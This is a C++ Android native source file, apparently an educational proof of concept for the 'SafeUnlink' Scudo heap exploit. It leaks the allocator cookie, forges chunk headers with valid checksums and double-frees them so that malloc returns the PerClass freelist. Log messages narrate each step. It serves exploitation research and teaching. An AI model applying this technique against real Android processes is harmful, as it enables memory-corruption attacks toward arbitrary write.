#include <jni.h>
#include <string>
#include <link.h>
#include <android/log.h>
#include <cassert>

/*
 * This file details the SafeUnlink exploit for Scudo. SafeUnlink targets the
 * PerClass structure to create a circular linked list which causes the address of the
 * PerClass structure to be returned by a call to malloc. This structure contains many pointers to
 * chunks and can serve as a useful primitive. Exploit detail were sourced from
 *
 * https://www.usenix.org/system/files/woot24-mao.pdf
 *
 * Requirements
 *  - Android memory tagging disabled
 *  - Scudo build without compact pointers in the PerClass structure
 *  - Ability to free a controlled location
 */

// Define log tags and shortcuts
#define LOG_TAG "FORGED_COMMIT_BASE"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,  LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

// Taken from scudo source
typedef struct UnpackedHeader {
    uintptr_t ClassId : 8;
    uint8_t State : 2;
    // Origin if State == Allocated, or WasZeroed otherwise.
    uint8_t OriginOrWasZeroed : 2;
    uintptr_t SizeOrUnusedBytes : 20;
    uintptr_t Offset : 16;
    uintptr_t Checksum : 16;
} UnpackedHeader;

typedef struct SecondaryChunkHeader {
    void *prev;
    void *next;
    uintptr_t commit_base;
    uintptr_t commit_size;
    uintptr_t base;
    uintptr_t capacity;
    uintptr_t mapped_base;
    char data;
    /* padding to 0x40 */
} SecondaryChunkHeader;

struct PerClass {
    uint16_t count;
    uint16_t max_count;
    uint32_t pad;
    uintptr_t class_size;
    uint32_t chunks[];
};

// Offsets derived from the Android 13 libc.so used by this PoC:
// build-id 4e07915368c859b1910c68c84a8de75f.
static constexpr uintptr_t SCUDO_TLS_SLOT_OFFSET = 0x30;
static constexpr uintptr_t SCUDO_PER_CLASS_STRIDE = 0x78;

static uintptr_t libc_base;

static int cb(struct dl_phdr_info *info, size_t size, void *data) {
    if (info->dlpi_name && strstr(info->dlpi_name, "/libc.so")) {
        libc_base = (uintptr_t)info->dlpi_addr;
        return 1;
    }
    return 0;
}

uint32_t leak_scudo_cookie() {
    dl_iterate_phdr(cb, nullptr);
    return *(volatile uint32_t *)(libc_base + 0xd06c0);
}

uint64_t pack_header(UnpackedHeader unpacked_header) {
    uint64_t conv;
    std::memcpy(&conv, &unpacked_header, sizeof(uint64_t));
    return conv & 0x00ffffffffffffffULL;
}

// Taken from Scudo source
static uint32_t crc32_u64(uint32_t crc, uint64_t v) {
    crc ^= (uint32_t)v;
    for (int i = 0; i < 32; i++)
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & 1));

    crc ^= (uint32_t)(v >> 32);
    for (int i = 0; i < 32; i++)
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & 1));

    return crc;
}

static uintptr_t scudo_header_checksum(uintptr_t user_ptr,
                                       uint64_t packed_header, uint32_t cookie) {
    uint64_t zeroed = packed_header & 0x0000ffffffffffffULL;

    uint32_t crc = crc32_u64(cookie, (uint64_t)user_ptr);
    crc = crc32_u64(crc, zeroed);

    return (uintptr_t)(crc ^ (crc >> 16));
}

static inline uintptr_t read_tpidr_el0() {
    uintptr_t value;
    asm volatile("mrs %0, tpidr_el0" : "=r"(value));
    return value;
}

static uintptr_t get_current_scudo_tsd() {
    uintptr_t tls = read_tpidr_el0();
    return *(uintptr_t *)(tls + SCUDO_TLS_SLOT_OFFSET) & ~1ULL;
}

static PerClass *get_per_class(uintptr_t class_id) {
    uintptr_t tsd = get_current_scudo_tsd();
    return (PerClass *)(tsd + class_id * SCUDO_PER_CLASS_STRIDE);
}

extern "C" JNIEXPORT void JNICALL
Java_xyz_cygnusx_safe_1unlink_MainActivity_run(
        JNIEnv* env,
        jobject /* this */) {

    uint32_t cookie = leak_scudo_cookie();
    LOGI("First we need to leak the scudo cookie. In this libc version it is found at libc base + 0xd06c0.\n Cookie: %x\n", cookie);
    LOGI("This attack attempts to get malloc to return a pointer to the PerClass freelist allowing us to gain a primitive which can easily lead to arbitrary write.");
    LOGI("We build a fake secondary chunk header next.");

    LOGI("We need the fake secondary header to be 16 byte aligned to conform with scudo.");
    SecondaryChunkHeader* fake_secondary_header_ptr = (SecondaryChunkHeader*) malloc(sizeof(SecondaryChunkHeader) + sizeof(UnpackedHeader));
    memset(fake_secondary_header_ptr, 0, sizeof(SecondaryChunkHeader));
    LOGI("We need to provide a valid commit_base field so that we don't fault when the chunk is freed.");
    fake_secondary_header_ptr->commit_base = (uintptr_t) fake_secondary_header_ptr;
    LOGI("We set the commit size to be 0x20000 which is the size of a secondary chunk");
    fake_secondary_header_ptr->commit_size = 0x20000;

    LOGI("Now build the fake primary portion of the header making sure the ClassId is zero so it is a secondary chunk.");

    // build a fake scudo header with a valid checksum.
    UnpackedHeader primary_portion = {
            .ClassId = 0, // secondary class
            .State = 1, // allocated
            .OriginOrWasZeroed = 0,
            .SizeOrUnusedBytes = 0,
            .Offset = 0
    };
    uint64_t packed_primary_portion = pack_header(primary_portion);

    // scudo checksum wants a tagged heap pointer
    char* real_primary_ptr = (char*) fake_secondary_header_ptr + 0x50;
    uintptr_t user = (long) real_primary_ptr & 0x00ffffffffffffffULL;
    uintptr_t scudo_ptr = user | 0x0200000000000000ULL;
    primary_portion.Checksum = scudo_header_checksum(scudo_ptr, packed_primary_portion, cookie);
    memcpy(real_primary_ptr - 0x10, &primary_portion, sizeof(UnpackedHeader));

    LOGI("Next we build a fake primary chunk that overlaps with the secondary chunk.");

    // build a fake scudo header with a valid checksum.
    UnpackedHeader unpacked_header = {
            .ClassId = 1, // class 1 chunk
            .State = 1, // allocated
            .OriginOrWasZeroed = 0,
            .SizeOrUnusedBytes = 0,
            .Offset = 0
    };
    uint64_t packed_header = pack_header(unpacked_header);

    char* data = (char*)(fake_secondary_header_ptr) + 0x10;

    // scudo checksum wants a tagged heap pointer
    user = (long) data & 0x00ffffffffffffffULL;
    scudo_ptr = user | 0x0200000000000000ULL;
    unpacked_header.Checksum = scudo_header_checksum(scudo_ptr, packed_header, cookie);
    LOGI("We copy the fake primary chunk header so that it overlaps with the fake secondary chunk header.");
    memcpy(fake_secondary_header_ptr, &unpacked_header, sizeof(UnpackedHeader));
    LOGI("Next we free the fake primary chunk essentially putting a pointer to the fake secondary chunk header into the freelist.");
    free(data);
    LOGI("We repeat this process putting a second pointer to the same fake secondary header in the PerClass freelist.");
    memcpy(fake_secondary_header_ptr, &unpacked_header, sizeof(UnpackedHeader));
    free(data);

    LOGI("Now we want to obtain the address of the PerClass structure for class_id 1.");
    int class_id = 1;
    PerClass *pc = get_per_class(class_id);

    LOGI("The PerClass.chunks field stores compacted pointers so we decompact the pointers and we should see the same pointer twice in the list.");

    LOGI("Next we forge the secondary chunk header's prev and next fields to the PerClass structure to complete the linked list.");
    fake_secondary_header_ptr->prev = pc;
    fake_secondary_header_ptr->next = pc;
    LOGI("We then free the fake secondary chunk to complete the linked list.");
    free(real_primary_ptr);
    LOGI("The next call to malloc should return a pointer to the PerClass list");
    LOGI("Pc: %p", malloc(0x10));

}
